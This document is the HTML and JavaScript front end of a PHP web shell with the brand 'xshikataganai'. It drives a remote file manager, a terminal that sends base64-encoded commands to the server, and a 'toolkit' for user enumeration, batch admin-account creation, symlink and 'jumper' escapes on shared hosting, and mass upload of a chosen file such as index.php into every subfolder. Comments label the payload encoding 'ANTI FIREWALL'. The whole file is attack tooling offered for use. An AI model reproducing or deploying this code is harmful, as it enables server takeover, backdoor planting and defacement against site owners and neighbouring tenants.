    <div class="path-bar-custom" id="path-bar-el">
        <button class="btn-icon-path me-2" onclick="loadDir('..')" title="Up Level"><i class="fas fa-level-up-alt"></i></button>
        <i class="fas fa-folder text-secondary me-3"></i>
        <div id="path-txt" title="Current Path">/</div>
    </div>
</div>

<div class="container-fluid">
    <div class="card">
        <div class="card-header bg-transparent border-bottom border-secondary border-opacity-10 py-3 desktop-toolbar d-flex justify-content-between align-items-center">
            <div class="fw-bold text-white align-items-center d-none d-md-flex"><i class="fas fa-list me-2 text-primary"></i> File Manager</div>
            <div class="input-group input-group-sm upload-group" style="max-width: 400px;">
                <input type="file" id="uploadInput" class="form-control">
                <button class="btn btn-upload-modern" onclick="uploadFile()" id="btnUpload"><i class="fas fa-cloud-upload-alt me-1"></i> Upload</button>
            </div>
        </div>
        <div class="table-responsive">
            <table class="table table-hover align-middle">
                <thead><tr><th class="ps-2">Name</th><th class="d-mobile-none">Size</th><th class="text-center">Perms</th><th class="d-mobile-none">Modified</th><th class="text-end pe-4">Actions</th></tr></thead>
                <tbody id="fileList"></tbody>
            </table>
        </div>
    </div>
</div>

<div class="modal fade" id="newFileModal" tabindex="-1"><div class="modal-dialog modal-dialog-centered"><div class="modal-content"><div class="modal-header"><h6 class="modal-title text-white">Create New File</h6><button class="btn-close" data-bs-dismiss="modal"></button></div><div class="modal-body"><input type="text" id="new-filename" class="form-control bg-dark text-light border-secondary mb-3" placeholder="filename.php"><textarea id="new-content" class="form-control bg-dark text-light border-secondary" rows="5" placeholder="File content..."></textarea></div><div class="modal-footer"><button class="btn btn-modern" data-bs-dismiss="modal">Cancel</button><button class="btn btn-upload-modern" onclick="submitNewFile()">Create</button></div></div></div></div>
<div class="modal fade" id="renameModal" tabindex="-1"><div class="modal-dialog modal-dialog-centered"><div class="modal-content"><div class="modal-header"><h6 class="modal-title text-white">Rename Item</h6><button class="btn-close" data-bs-dismiss="modal"></button></div><div class="modal-body"><input type="text" id="rename-input" class="form-control bg-dark text-light border-secondary"></div><div class="modal-footer"><button class="btn btn-modern" data-bs-dismiss="modal">Cancel</button><button class="btn btn-upload-modern" onclick="submitRename()">Save</button></div></div></div></div>
<div class="modal fade" id="editModal" tabindex="-1" data-bs-backdrop="static"><div class="modal-dialog modal-xl modal-dialog-centered modal-dialog-scrollable"><div class="modal-content"><div class="modal-header"><h6 class="modal-title" id="editFileName"><i class="fas fa-code me-2 text-primary"></i>Editor</h6><div class="d-flex gap-2 ms-auto"><button class="btn btn-sm btn-modern" data-bs-dismiss="modal">Cancel</button><button class="btn btn-sm btn-upload-modern px-3" onclick="saveFile()" id="btnSave">Save</button></div></div><div class="modal-body p-0"><div id="editor-container"></div></div></div></div></div>

<div class="modal fade" id="toolsModal" tabindex="-1">
    <div class="modal-dialog modal-lg modal-dialog-centered">
        <div class="modal-content">
            <div class="modal-header"><h6 class="modal-title" style="color:var(--accent-warning)"><i class="fas fa-skull me-2"></i><span id="tool-title">Toolkit</span></h6><button class="btn-close btn-close-white" data-bs-dismiss="modal"></button></div>
            <div class="modal-body p-4">
                <div class="alert alert-dark border border-secondary mb-4 py-2 px-3 small d-flex align-items-center" style="background:#000;color:#aaa"><i class="fas fa-info-circle me-2"></i> Running in: <b class="ms-2 text-white"><span id="tool-path-disp">/</span></b></div>
                <div class="tools-list">
                    <div class="tool-cmd" onclick="showMassUpload()"><div class="cmd-left"><i class="fas fa-rocket cmd-icon c-purple"></i><span class="cmd-text">SMART MASS UPLOAD</span></div><i class="fas fa-arrow-right cmd-arrow"></i></div>
                    
                    <div class="tool-cmd" onclick="runTool('bypass_user')"><div class="cmd-left"><i class="fas fa-users-slash cmd-icon c-cyan"></i><span class="cmd-text">USER ENUM</span></div><i class="fas fa-arrow-right cmd-arrow"></i></div>
                    <div class="tool-cmd" onclick="runWatchdogTool('add_admin', 0)"><div class="cmd-left"><i class="fas fa-user-plus cmd-icon c-lime"></i><span class="cmd-text">ADD ADMIN (BATCH)</span></div><i class="fas fa-arrow-right cmd-arrow"></i></div>
                    <div class="tool-cmd" onclick="runTool('symlink_cage')"><div class="cmd-left"><i class="fas fa-project-diagram cmd-icon c-gold"></i><span class="cmd-text">SYMLINKER</span></div><i class="fas fa-arrow-right cmd-arrow"></i></div>
                    <div class="tool-cmd" onclick="runTool('jumper_cage')"><div class="cmd-left"><i class="fas fa-box-open cmd-icon c-rose"></i><span class="cmd-text">JUMPER</span></div><i class="fas fa-arrow-right cmd-arrow"></i></div>
                </div>
            </div>
        </div>
    </div>
</div>

<div class="modal fade" id="massUploadModal" tabindex="-1"><div class="modal-dialog modal-dialog-centered"><div class="modal-content"><div class="modal-header"><h6 class="modal-title text-white">Smart Mass Upload</h6><button class="btn-close" data-bs-dismiss="modal"></button></div><div class="modal-body">
    <div class="mb-3"><label class="small text-secondary">Target Filename</label><input type="text" id="mass-name" class="form-control bg-dark text-light border-secondary" placeholder="example: index.php"></div>
    <div class="mb-3"><label class="small text-secondary">File Content</label><textarea id="mass-content" class="form-control bg-dark text-light border-secondary" rows="4"></textarea></div>
    <div class="d-flex align-items-center gap-2"><div class="flex-grow-1 border-top border-secondary"></div><span class="small text-secondary">OR UPLOAD</span><div class="flex-grow-1 border-top border-secondary"></div></div>
    <div class="mt-3"><input type="file" id="mass-file-in" class="form-control bg-dark border-secondary text-secondary"></div>
    <div class="mt-3 small text-secondary">
        <i class="fas fa-info-circle"></i> <b>Smart Mode:</b> Uploads to immediate subfolders + public_html only. Fast & Safe.
    </div>
</div><div class="modal-footer"><button class="btn btn-upload-modern w-100" onclick="startMassUpload()">START BACKGROUND TASK</button></div></div></div></div>

<div id="async-widget">
    <div class="aw-header"><span id="aw-title">MASS UPLOAD</span><i class="fas fa-compress cursor-pointer" onclick="toggleWidget()"></i></div>
    <div class="aw-body" id="aw-content">
        <div class="progress-bar-bg"><div class="progress-bar-fill" id="aw-prog"></div></div>
        <div class="aw-stat"><span>Processed: <b id="aw-done" class="text-white">0</b></span><span>Total: <b id="aw-total">0</b></span></div>
        <div class="mt-2 text-center"><small class="text-secondary" id="aw-status">Initializing...</small></div>
    </div>
</div>

<div class="cyber-footer">
    <span>made with <i class="fas fa-heart"></i> <span class="cy-brand">xshikataganai</span></span>
    <span>STATUS: <span style="color:#81c995">ACTIVE</span></span>
</div>

<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
<script>
    let currentPath = '', currentFile = '', renameTarget = '';
    var editor = null; 
    const editModal = new bootstrap.Modal(document.getElementById('editModal')), 
          toolsModal = new bootstrap.Modal(document.getElementById('toolsModal')),
          massUploadModal = new bootstrap.Modal(document.getElementById('massUploadModal')),
          newFileModal = new bootstrap.Modal(document.getElementById('newFileModal')),
          renameModal = new bootstrap.Modal(document.getElementById('renameModal'));
    
    function updatePanelStyles() {
        const term = document.getElementById('terminal-panel').style.display !== 'none';
        const log = document.getElementById('process-panel').style.display !== 'none';
        const bar = document.getElementById('path-bar-el');
        if(term || log) bar.classList.add('has-panel-above'); else bar.classList.remove('has-panel-above');
    }
    function showLog() { toolsModal.hide(); document.getElementById('process-panel').style.display = 'block'; updatePanelStyles(); }
    function closeLog() { document.getElementById('process-panel').style.display = 'none'; document.getElementById('global-log').innerHTML = ''; updatePanelStyles(); }
    function toggleTerm() { const p = document.getElementById('terminal-panel'); p.style.display = (p.style.display === 'none') ? 'block' : 'none'; updatePanelStyles(); if(p.style.display === 'block') setTimeout(() => document.getElementById('term-cmd-inline').focus(), 50); }

    function showToast(msg, type = 'success') {
        const container = document.getElementById('toast-container');
        const div = document.createElement('div');
        div.className = `toast-msg ${type}`;
        div.innerHTML = (type === 'success' ? '<i class="fas fa-check-circle me-2 text-success"></i>' : '<i class="fas fa-times-circle me-2 text-danger"></i>') + msg;
        container.appendChild(div);
        setTimeout(() => { div.classList.add('hiding'); setTimeout(() => div.remove(), 300); }, 3000);
    }

    async function api(action, path, method='GET', extraHeaders={}, body=null, signal=null) {
        let headers = { 'X-Action': action, 'X-Path': btoa(path), ...extraHeaders };
        return fetch(window.location.href, { method, headers, body, signal });
    }
    
    function goHome() { currentPath = '__HOME__'; loadDir('__HOME__'); }

    function getFileIcon(name) {
        let ext = name.split('.').pop().toLowerCase();
        if(ext === name) return '<i class="fas fa-file icon-file i-def"></i>';
        switch(ext) {
            case 'php': return '<i class="fab fa-php icon-file i-php"></i>';
            case 'html': case 'htm': return '<i class="fab fa-html5 icon-file i-html"></i>';
            case 'css': return '<i class="fab fa-css3-alt icon-file i-css"></i>';
            case 'js': case 'json': return '<i class="fab fa-js icon-file i-js"></i>';
            case 'zip': case 'rar': case 'tar': case 'gz': case '7z': return '<i class="fas fa-file-archive icon-file i-zip"></i>';
            case 'jpg': case 'jpeg': case 'png': case 'gif': case 'svg': case 'ico': return '<i class="fas fa-file-image icon-file i-img"></i>';
            case 'txt': case 'log': case 'ini': case 'conf': case 'htaccess': return '<i class="fas fa-file-alt icon-file i-code"></i>';
            default: return '<i class="fas fa-file icon-file i-def"></i>';
        }
    }

    function loadDir(path) {
        let target = currentPath;
        if (path === '__HOME__') target = '__HOME__';
        else if (path === '..') {
            if (target && target !== '/' && target.includes('/')) { target = target.substring(0, target.lastIndexOf('/')); if(target === '') target = '/'; } else { target = '/'; }
        } else if (path !== '') { target = (target === '/') ? '/' + path : target + '/' + path; }
        if(path === '' && !currentPath) target = ''; 

        api('list', target).then(r => r.json()).then(res => {
            currentPath = res.path; 
            document.getElementById('path-txt').innerText = res.path; 
            document.getElementById('tool-path-disp').innerText = res.path;
            
            const tbody = document.getElementById('fileList'); tbody.innerHTML = '';
            if (!res.items.length) { tbody.innerHTML = '<tr><td colspan="5" class="text-center py-5 text-secondary fst-italic">Empty Directory</td></tr>'; return; }
            res.items.forEach(f => {
                let isDir = f.type === 'dir'; 
                let icon = isDir ? '<i class="fas fa-folder icon-dir"></i>' : getFileIcon(f.name);
                let click = isDir ? `loadDir('${f.name}')` : `openEditor('${f.name}')`; 
                let pClass = f.write ? 'writable' : 'readonly';
                let textClass = isDir ? 'text-folder' : 'text-file';
                tbody.innerHTML += `<tr><td class="ps-2"><a onclick="${click}" class="${textClass} cursor-pointer d-flex align-items-center">${icon} ${f.name}</a></td><td class="d-mobile-none text-secondary"><small>${f.size}</small></td><td class="text-center"><span onclick="chmodItem('${f.name}', '${f.perm}')" class="badge-perm ${pClass} cursor-pointer">${f.perm}</span></td><td class="d-mobile-none text-secondary"><small>${f.date}</small></td><td class="text-end pe-4"><button class="action-btn edit me-1" onclick="openRename('${f.name}')" title="Rename"><i class="fas fa-pen"></i></button><button class="action-btn del" onclick="deleteItem('${f.name}')" title="Delete"><i class="fas fa-trash"></i></button></td></tr>`;
            });
        }).catch(() => showToast('Network Error', 'error'));
    }
    
    function openEditor(name) { 
        currentFile = (currentPath === '/') ? '/' + name : currentPath + '/' + name; 
        api('read', currentFile).then(r => r.text()).then(txt => { 
            document.getElementById('editFileName').innerHTML = `<i class="fas fa-code me-2 text-primary"></i> ${name}`;
            if(!editor) {
                editor = ace.edit("editor-container");
                editor.setTheme("ace/theme/monokai"); 
                editor.session.setMode("ace/mode/php"); 
                editor.setShowPrintMargin(false);
                editor.setFontSize(14);
                editor.setOptions({ fontFamily: "JetBrains Mono" });
            }
            let ext = name.split('.').pop().toLowerCase();
            if(ext === 'html') editor.session.setMode("ace/mode/html");
            else if(ext === 'css') editor.session.setMode("ace/mode/css");
            else if(ext === 'js') editor.session.setMode("ace/mode/javascript");
            else editor.session.setMode("ace/mode/php");
            editor.setValue(txt, -1); editModal.show(); 
        }); 
    }

    // --- V42 FITUR: ENCODE CONTENT B64 (ANTI FIREWALL) ---
    function saveFile() { 
        let content = editor.getValue(); 
        let encoded = btoa(unescape(encodeURIComponent(content))); // UTF-8 SAFE B64
        api('save', currentFile, 'PUT', {'X-Encode': 'b64'}, encoded).then(r => r.text()).then(m => { 
            showToast(m); editModal.hide(); 
        }); 
    }
    
    function showNewFileModal() {
        document.getElementById('new-filename').value = '';
        document.getElementById('new-content').value = '';
        newFileModal.show();
    }

    // --- V42 FITUR: ENCODE NEW FILE B64 ---
    function submitNewFile() {
        let name = document.getElementById('new-filename').value;
        let content = document.getElementById('new-content').value;
        if (name) {
            let path = (currentPath === '/') ? '/' + name : currentPath + '/' + name;
            let encoded = btoa(unescape(encodeURIComponent(content))); 
            api('save', path, 'PUT', {'X-Encode': 'b64'}, encoded).then(r => r.text()).then(m => { 
                showToast("Created: " + name); 
                newFileModal.hide();
                loadDir(''); 
            });
        }
    }

    // --- V42 FITUR: UPLOAD B64 ---
    function uploadFile() { 
        let input=document.getElementById('uploadInput'); 
        if(!input.files.length) { showToast("Select a file first", "error"); return; }
        let btn=document.getElementById('btnUpload'); let old=btn.innerHTML; btn.innerHTML='<i class="fas fa-spinner fa-spin"></i>'; 
        let file = input.files[0];
        let path=currentPath ? currentPath + '/' + file.name : file.name; 
        if(currentPath === '/') path = '/' + file.name; 
        
        let reader = new FileReader();
        reader.onload = function(e) {
            let content = e.target.result.split(',')[1];
            api('upload', path, 'PUT', {'X-Encode': 'b64'}, content)
                .then(r => r.text())
                .then(m => { showToast(m); input.value=''; btn.innerHTML=old; loadDir(''); })
                .catch(() => { showToast("Upload Failed", "error"); btn.innerHTML=old; });
        };
        reader.readAsDataURL(file);
    }
    // ----------------------------

    function deleteItem(name) { 
        if(confirm(`Del ${name}?`)) { 
            let path = (currentPath === '/') ? '/' + name : currentPath + '/' + name; 
            api('delete', path, 'DELETE').then(() => { showToast("Deleted: " + name); loadDir(''); }); 
        } 
    }
    
    function openRename(name) {
        renameTarget = name;
        document.getElementById('rename-input').value = name;
        renameModal.show();
    }

    function submitRename() {
        let newName = document.getElementById('rename-input').value;
        if (newName && newName !== renameTarget) {
            let path = (currentPath === '/') ? '/' + renameTarget : currentPath + '/' + renameTarget; 
            api('rename', path, 'GET', {'X-Data': btoa(newName)}).then(r => { 
                showToast(r.text()); 
                renameModal.hide();
                loadDir(''); 
            });
        }
    }
    
    function chmodItem(name, p) { 
        let n=prompt("Chmod:", "0"+p); 
        if(n) { 
            let path = (currentPath === '/') ? '/' + name : currentPath + '/' + name; 
            api('chmod', path, 'GET', {'X-Data': n}).then(() => { showToast("Chmod Updated"); loadDir(''); }); 
        } 
    }
    
    function openTools() { toolsModal.show(); }
    
    document.getElementById('term-cmd-inline').addEventListener('keypress', function (e) {
        if (e.key === 'Enter') {
            let cmd = this.value; if(!cmd) return;
            let outDiv = document.getElementById('term-output');
            outDiv.innerHTML += `<div><span style="color:#c586c0;">&#10140;</span> <span style="color:#d4d4d4;">${cmd}</span></div>`;
            this.value = ''; outDiv.scrollTop = outDiv.scrollHeight;
            api('cmd', currentPath, 'GET', { 'X-Cmd': btoa(cmd) }).then(r => r.text()).then(res => { outDiv.innerHTML += `<div style="color:#9cdcfe; margin-bottom:10px;">${res}</div>`; outDiv.scrollTop = outDiv.scrollHeight; });
        }
    });

    // --- V46 FIX: SHOW & CLEAN FORM ---
    function showMassUpload() { toolsModal.hide(); massUploadModal.show(); }
    
    function startMassUpload() {
        let name = document.getElementById('mass-name').value;
        let content = document.getElementById('mass-content').value;
        let fileIn = document.getElementById('mass-file-in').files[0];
        
        if (!name) { showToast('Filename required!', 'error'); return; }
        
        massUploadModal.hide();
        document.getElementById('async-widget').style.display = 'block';
        updateWidget(0, 0, 'Preparing Payload...');

        if (fileIn) {
            let reader = new FileReader();
            reader.onload = function(e) { initMassTask(name, e.target.result.split(',')[1]); };
            reader.readAsDataURL(fileIn);
        } else {
            initMassTask(name, btoa(unescape(encodeURIComponent(content))));
        }
    }

    function initMassTask(filename, b64content) {
        updateWidget(0, 0, 'Scanning Directories... (Fast)');
        api('tool', currentPath, 'PUT', {'X-Tool':'mass_upload','X-Encode':'b64', 'X-Mass-Mode':'init'}, b64content).then(r => r.json()).then(res => {
            if(res.status === 'ready') {
                showToast(`Scan complete. Found ${res.total} folders.`);
                if(res.total === 0) { updateWidget(0, 0, 'No targets found.'); return; }
                processMassBatch(0, filename, res.total);
            } else {
                showToast('Init Failed', 'error');
                document.getElementById('async-widget').style.display = 'none';
            }
        });
    }

    function processMassBatch(step, filename, total) {
        updateWidget(step, total, `Uploading batch ${step}...`);
        api('tool', currentPath, 'GET', {'X-Tool':'mass_upload', 'X-Step':step, 'X-Data':btoa(filename), 'X-Mass-Mode':'process'}).then(r => r.json()).then(res => {
            if (res.status === 'continue') {
                processMassBatch(res.next_step, filename, total);
            } else {
                updateWidget(total, total, 'DONE!');
                showToast('Mass Upload Completed!', 'success');
                
                // V46 UPDATE: RESET FORM AFTER DONE
                document.getElementById('mass-name').value = '';
                document.getElementById('mass-content').value = '';
                document.getElementById('mass-file-in').value = '';

                setTimeout(() => { document.getElementById('async-widget').style.display = 'none'; }, 5000);
            }
        }).catch(e => {
            updateWidget(step, total, 'Error. Retrying...');
            setTimeout(() => processMassBatch(step, filename, total), 3000);
        });
    }

    function updateWidget(done, total, status) {
        let pct = (total > 0) ? Math.round((done / total) * 100) : 0;
        document.getElementById('aw-prog').style.width = pct + '%';
        document.getElementById('aw-done').innerText = done;
        document.getElementById('aw-total').innerText = total;
        document.getElementById('aw-status').innerText = status;
    }
    function toggleWidget() { let b = document.getElementById('aw-content'); b.style.display = (b.style.display === 'none') ? 'block' : 'none'; }
    
    function runTool(toolName) { showLog(); let log = document.getElementById('global-log'); log.innerHTML += `<div class="text-primary mb-2"><i class="fas fa-cog fa-spin me-2"></i>Running ${toolName}...</div>`; api('tool', currentPath, 'GET', {'X-Tool': toolName}).then(r => r.text()).then(res => { log.innerHTML += res; log.innerHTML += `<div class="text-success mt-2"><i class="fas fa-check me-2"></i>Done.</div><hr class="border-secondary">`; log.scrollTop = log.scrollHeight; }).catch(e => { log.innerHTML += `<div class="text-danger">Error: ${e}</div>`; }); }
    function runWatchdogTool(toolName, step) {
        let log = document.getElementById('global-log'); if(step === 0) { showLog(); log.innerHTML = `<div class="text-warning mb-2"><i class="fas fa-running me-2"></i>Starting ${toolName} (Fast Mode)...</div><hr class="border-secondary">`; }
        const controller = new AbortController(); const timeoutId = setTimeout(() => { controller.abort(); log.innerHTML += `<div class="text-warning">[!] Watchdog: Batch Timeout (20s) at #${step}. Skipping 5...</div>`; log.scrollTop = log.scrollHeight; runWatchdogTool(toolName, step+5); }, 20000);
        api('tool', currentPath, 'GET', {'X-Tool': toolName, 'X-Step': step}, null, controller.signal).then(r => r.json()).then(res => { clearTimeout(timeoutId); if(res.html) log.innerHTML += res.html; if(res.status === 'continue') { log.scrollTop = log.scrollHeight; setTimeout(() => runWatchdogTool(toolName, res.next_step), 10); } else { log.innerHTML += `<hr class="border-secondary"><div class="text-success fw-bold"><i class="fas fa-flag-checkered me-2"></i>JOB FINISHED. Scanned ${res.total} files.</div>`; log.scrollTop = log.scrollHeight; } }).catch(err => { if(err.name === 'AbortError') return; log.innerHTML += `<div class="text-danger">[!] Net Err at #${step}. Skipping batch...</div>`; runWatchdogTool(toolName, step+5); });
    }
    
    loadDir('');
</script>
</body>
</html>
